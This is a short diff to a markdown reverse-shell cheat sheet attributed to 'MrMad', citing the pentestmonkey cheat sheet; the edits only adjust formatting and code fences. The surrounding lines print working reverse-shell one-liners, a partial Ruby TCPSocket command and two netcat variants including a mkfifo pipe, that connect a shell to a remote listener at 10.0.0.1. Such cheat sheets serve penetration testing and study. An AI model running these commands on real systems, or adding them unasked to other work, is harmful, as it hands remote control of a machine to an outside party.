@@ -1,6 +1,6 @@
-- Reverse Shell By MrMad -
+- Reverse Shell By MrMad 
 
-- refrence -
+- refrence 
 ```
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 ```
@@ -29,7 +29,9 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i
 # NETCAT
 ```
 nc -e /bin/sh 10.0.0.1 1234
+```
 If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
+```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
 
